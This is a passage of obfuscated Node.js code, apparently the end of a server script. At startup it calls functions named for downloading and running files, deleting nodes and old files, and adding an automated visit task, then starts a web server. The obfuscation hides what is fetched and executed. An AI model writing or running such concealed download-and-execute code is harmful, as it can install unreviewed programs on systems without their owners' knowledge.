console[_0x2c2f3e(0x1ba)]('automatic\x20access\x20task\x20added\x20successfully'),_0x2ad375;}catch(_0xce5c8a){return console['error'](_0x2c2f3e(0x20d)+_0xce5c8a[_0x2c2f3e(0x1e6)]),null;}}async function startserver(){const _0x5a82bf=_0x242c34;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x48b938){console[_0x5a82bf(0x1b5)]('Error\x20in\x20startserver:',_0x48b938);}}startserver()[_0x242c34(0x172)](_0x48b4b2=>{const _0x4edd7e=_0x242c34;console['error'](_0x4edd7e(0x205),_0x48b4b2);}),app[_0x242c34(0x1d4)](PORT,()=>console[_0x242c34(0x1ba)](_0x242c34(0x195)+PORT+'!'));
